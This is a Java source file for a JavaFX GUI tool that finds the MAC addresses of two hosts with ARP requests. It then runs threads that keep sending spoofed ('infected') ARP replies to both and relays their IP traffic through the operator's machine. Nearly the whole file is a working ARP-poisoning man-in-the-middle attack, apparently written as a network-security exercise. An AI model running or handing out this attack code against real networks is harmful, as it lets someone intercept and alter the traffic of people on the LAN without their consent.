package controller;

import java.net.InetAddress;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.ResourceBundle;

import org.jnetpcap.Pcap;
import org.jnetpcap.PcapHeader;
import org.jnetpcap.PcapIf;
import org.jnetpcap.nio.JBuffer;
import org.jnetpcap.nio.JMemory;
import org.jnetpcap.packet.JRegistry;
import org.jnetpcap.packet.PcapPacket;
import org.jnetpcap.protocol.lan.Ethernet;
import org.jnetpcap.protocol.network.Ip4;

import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.Button;
import javafx.scene.control.ListView;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import model.ARP;
import model.Util;

public class Controller implements Initializable{
	
	@FXML
	private ListView<String> networkListView;
	
	@FXML
	private TextArea textArea;
	
	@FXML
	private Button pickButton;
	
	@FXML
	private TextField myIP;
	
	@FXML
	private TextField senderIP;
	
	@FXML
	private TextField targetIP;
	
	@FXML
	private Button getMACButton;
	
	ObservableList<String> networkList = FXCollections.observableArrayList();
	
	private ArrayList<PcapIf> allDevs = null;
	
	@Override
	public void initialize(URL location, ResourceBundle resources) {
		allDevs = new ArrayList<PcapIf>();
		StringBuilder errbuf = new StringBuilder();
		int r = Pcap.findAllDevs(allDevs, errbuf);
		if (r == Pcap.NOT_OK || allDevs.isEmpty()) {
			textArea.appendText("네트워크 장치를 찾을 수 없습니다.\n" + errbuf.toString() + "\n");
			return;
		}
		textArea.appendText("네트워크 장치를 찾았습니다.\n원하시는 장치를 선택해주세요.\n");
		for (PcapIf device: allDevs) {
			networkList.add(device.getName() + " " + 
					((device.getDescription() != null) ? device.getDescription() : "설명 없음"));
		}
		networkListView.setItems(networkList);
	}
	
	public void networkPickAction() {
		if (networkListView.getSelectionModel().getSelectedIndex() < 0) {
			return;
		}
		Main.device = allDevs.get(networkListView.getSelectionModel().getSelectedIndex());
		networkListView.setDisable(true);
		pickButton.setDisable(true);
		
		int snaplen = 64*1024;
		int flags = Pcap.MODE_NON_PROMISCUOUS;
		int timeout = 1;
		
		StringBuilder errbuf = new StringBuilder();
		Main.pcap = Pcap.openLive(Main.device.getName(), snaplen, flags, timeout, errbuf);
		
		if (Main.pcap == null) {
			textArea.appendText("네트워크 장치를 열 수 없습니다.\n" + errbuf.toString() + "\n");
			return;
		}
		textArea.appendText("장치 선택: " + Main.device.getName() + "\n");
		textArea.appendText("네트워크 장치를 활성화했습니다.\n");
	}
	
	public void getMACAction() {
		if (!pickButton.isDisable()) {
			textArea.appendText("네트워크 장치를 먼저 선택해주세요.\n");
			return;
		}
		
		ARP arp = new ARP();
		Ethernet eth = new Ethernet();
		PcapHeader header = new PcapHeader(JMemory.POINTER);
		JBuffer buf = new JBuffer(JMemory.POINTER);
		ByteBuffer buffer = null;
		
		int id = JRegistry.mapDLTToId(Main.pcap.datalink());
		
		try {
			Main.myMAC = Main.device.getHardwareAddress();
			Main.myIP = InetAddress.getByName(myIP.getText()).getAddress();
			Main.senderIP = InetAddress.getByName(senderIP.getText()).getAddress();
			Main.targetIP = InetAddress.getByName(targetIP.getText()).getAddress();
		} catch (Exception e) {
			textArea.appendText("IP 주소가 잘못되었습니다.\n");
		}
		
		myIP.setDisable(true);
		senderIP.setDisable(true);
		targetIP.setDisable(true);
		getMACButton.setDisable(true);
		
		arp = new ARP();
		arp.makeARPRequest(Main.myMAC, Main.myIP, Main.targetIP);
		buffer = ByteBuffer.wrap(arp.getPacket());
		if (Main.pcap.sendPacket(buffer) != Pcap.OK) {
			System.out.println(Main.pcap.getErr());
		}
		textArea.appendText("타겟에게 ARP Request를 보냈습니다.\n" +
				Util.bytesToSTring(arp.getPacket()) + "\n");
		
		long targetStartTime = System.currentTimeMillis();
		Main.targetMAC = new byte[6];
		while (Main.pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) {
			if (System.currentTimeMillis() - targetStartTime >= 500) {
				textArea.appendText("타겟이 응답하지 않습니다.\n");
				return;
			}
			PcapPacket packet = new PcapPacket(header, buf);
			packet.scan(id);
			byte[] sourceIP = new byte[4];
			System.arraycopy(packet.getByteArray(0, packet.size()), 28, sourceIP, 0, 4);
			if (packet.getByte(12) == 0x08 && packet.getByte(13) == 0x06
					&& packet.getByte(20) == 0x00 && packet.getByte(21) == 0x02
					&& Util.bytesToSTring(sourceIP).equals(Util.bytesToSTring(Main.targetIP))
					&& packet.hasHeader(eth)) {
				Main.targetMAC = eth.source();
				break;
			} else {
				continue;
			}
		}
			
		textArea.appendText("타겟 맥 주소: " +
				Util.bytesToSTring(Main.targetMAC) + "\n");
		
		arp = new ARP();
		arp.makeARPRequest(Main.myMAC, Main.myIP, Main.senderIP);
		buffer = ByteBuffer.wrap(arp.getPacket());
		if (Main.pcap.sendPacket(buffer) != Pcap.OK) {
			System.out.println(Main.pcap.getErr());
		}
		textArea.appendText("센더에게 ARP Request를 보냈습니다.\n" + 
					Util.bytesToSTring(arp.getPacket()) + "\n");
		
		long senderStartTime = System.currentTimeMillis();
		Main.senderMAC = new byte[6];
		while (Main.pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) {
			if (System.currentTimeMillis() - senderStartTime >= 500) {
				textArea.appendText("센더가 응답하지 않습니다.\n");
				return;
			}
			PcapPacket packet = new PcapPacket(header, buf);
			packet.scan(id);
			byte[] sourceIP = new byte[4];
			System.arraycopy(packet.getByteArray(0, packet.size()), 28, sourceIP, 0, 4);
			if (packet.getByte(12) == 0x08 && packet.getByte(13) == 0x06
					&& packet.getByte(20) == 0x00 && packet.getByte(21) == 0x02
					&& Util.bytesToSTring(sourceIP).equals(Util.bytesToSTring(Main.senderIP))
					&& packet.hasHeader(eth)) {
				Main.senderMAC = eth.source();
				break;
			} else {
				continue;
			}
		}
		
		textArea.appendText("센더 맥 주소: " + 
				Util.bytesToSTring(Main.senderMAC) + "\n");
		
		new SenderARPSpoofing().start();
		new TargetARPSpoofing().start();
		new ARPRelay().start();
	}
	
	class SenderARPSpoofing extends Thread {
		@Override
		public void run() {
			ARP arp = new ARP();
			arp.makeARPReply(Main.senderMAC, Main.myMAC, Main.myMAC, 
					Main.targetIP, Main.senderMAC, Main.senderIP);
			Platform.runLater(() -> {
				textArea.appendText("센더에게 감염된 ARP Reply 패킷을 계속해서 전송합니다.\n.");
			});
			while(true) {
				ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
				Main.pcap.sendPacket(buffer);
				try {
					Thread.sleep(200);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}
	
	class TargetARPSpoofing extends Thread {
		@Override
		public void run() {
			ARP arp = new ARP();
			arp.makeARPReply(Main.targetMAC, Main.myMAC, Main.myMAC, 
					Main.senderIP, Main.targetMAC, Main.targetIP);
			Platform.runLater(() -> {
				textArea.appendText("타겟에게 감염된 ARP Reply 패킷을 계속해서 전송합니다.\n.");
			});
			while(true) {
				ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
				Main.pcap.sendPacket(buffer);
				try {
					Thread.sleep(200);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
	}
	
	class ARPRelay extends Thread {
		@Override
		public void run() {
			Ip4 ip = new Ip4();
			PcapHeader header = new PcapHeader(JMemory.POINTER);
			JBuffer buf = new JBuffer(JMemory.POINTER);
			Platform.runLater(() -> {
				textArea.appendText("ARP Relay를 진행합니다.\n");
			});
			
			while(Main.pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) {
				PcapPacket packet = new PcapPacket(header, buf);
				int id = JRegistry.mapDLTToId(Main.pcap.datalink());
				packet.scan(id);
				
				byte[] data = packet.getByteArray(0, packet.size());
				byte[] tempDestinationMAC = new byte[6];
				byte[] tempSourceMAC = new byte[6];
				
				System.arraycopy(data, 0, tempDestinationMAC, 0, 6);
				System.arraycopy(data, 6, tempSourceMAC, 0, 6);
				
				if(Util.bytesToSTring(tempDestinationMAC).equals(Util.bytesToSTring(Main.myMAC)) &&
						Util.bytesToSTring(tempSourceMAC).equals(Util.bytesToSTring(Main.myMAC))) {
					if(packet.hasHeader(ip)) {
						if(Util.bytesToSTring(ip.source()).equals(Util.bytesToSTring(Main.myIP))) { // 특정 장비에서 오류가 생긴 패킷을 정상적으로 동작하도록 해줌
							System.arraycopy(Main.targetMAC, 0, data, 0, 6);
							ByteBuffer buffer = ByteBuffer.wrap(data);
							Main.pcap.sendPacket(buffer);
						}
					}
				}
				
				else if(Util.bytesToSTring(tempDestinationMAC).equals(Util.bytesToSTring(Main.myMAC)) &&
						Util.bytesToSTring(tempSourceMAC).equals(Util.bytesToSTring(Main.senderMAC))) { //sender ARP Relay
					if(packet.hasHeader(ip)) {
						System.arraycopy(Main.targetMAC, 0, data, 0, 6);
						System.arraycopy(Main.myMAC, 0, data, 6, 6);
						ByteBuffer buffer = ByteBuffer.wrap(data);
						Main.pcap.sendPacket(buffer);
					}
				}
				
				else if(Util.bytesToSTring(tempDestinationMAC).equals(Util.bytesToSTring(Main.myMAC)) &&
						Util.bytesToSTring(tempSourceMAC).equals(Util.bytesToSTring(Main.targetMAC))) { //target ARP Relay
					if(packet.hasHeader(ip)) {
						if(Util.bytesToSTring(ip.destination()).equals(Util.bytesToSTring(Main.senderIP))) {
							System.arraycopy(Main.senderMAC, 0, data, 0, 6);
							System.arraycopy(Main.myMAC, 0, data, 6, 6);
							ByteBuffer buffer = ByteBuffer.wrap(data);
							Main.pcap.sendPacket(buffer);
						}
					}
				}
				//System.out.println(Util.bytesToSTring(buf.getByteArray(0, buf.size())));
			}
		}
	}
}
